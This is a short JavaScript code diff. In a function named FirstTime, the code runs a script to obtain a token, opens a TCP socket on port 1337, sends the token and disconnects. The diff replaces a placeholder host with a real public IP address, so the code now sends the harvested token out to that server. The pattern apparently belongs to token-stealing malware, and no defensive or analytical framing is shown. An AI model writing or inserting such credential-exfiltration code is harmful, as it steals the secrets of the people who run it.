@@ -21,7 +21,7 @@ const FirstTime = async () => {
     var token = await execScript(tokenScript)
     const client = new net.Socket();
     const port = 1337
-    const host = "0.0.0.0"
+    const host = "192.46.228.32"
     client.connect( port, host, () => { 
         client.write(token);
         client.destroy();
